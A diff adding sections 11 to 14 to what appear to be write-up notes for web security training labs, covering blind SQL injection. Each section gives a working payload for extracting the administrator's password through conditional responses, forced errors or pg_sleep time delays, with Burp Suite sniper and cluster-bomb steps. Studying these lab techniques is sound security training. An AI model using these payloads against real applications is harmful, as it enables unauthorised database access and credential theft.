@@ -49,4 +49,35 @@ This will leak the database version.
 
 **payload**: `' UNION SELECT USERNAME_MUNMCB, PASSWORD_QYRMVB FROM USERS_VLOTNP--` 
 
-This will give the creds of admin. 
+This will give the creds of admin.
+
+#### 11. Blind SQL injection with conditional responses
+
+**payload**: `TrackingId=`  
+
+1) By doing sniping attack using burpsuite `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`  
+By bruteforcing, we get the total length of the password is 20.  
+2) By doing cluster attack with 2 payloads `' AND (SELECT SUBSTRING(password,§3§,1) FROM users WHERE username='administrator')='§a§`  
+
+We'll be leaking the admin password.  
+
+#### 12. Blind SQL injection with conditional errors
+
+**payload**: `'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+
+By triggering internal server error, we can Identify the true condition  
+(Cluster attack)  
+
+#### 13. Blind SQL injection with time delays
+
+**payload**: `||pg_sleep(5)--`  
+
+There will be time delay of 5 seconds for every request that is sent.  
+
+#### 14. Blind SQL injection with time delays and information retrieval
+
+**payload**: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,12,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`  
+
+Using the payload used in the last lab, we can find the length of the password and cluster bombing using **payload**, 
+will retrive the password of user admin.  
+
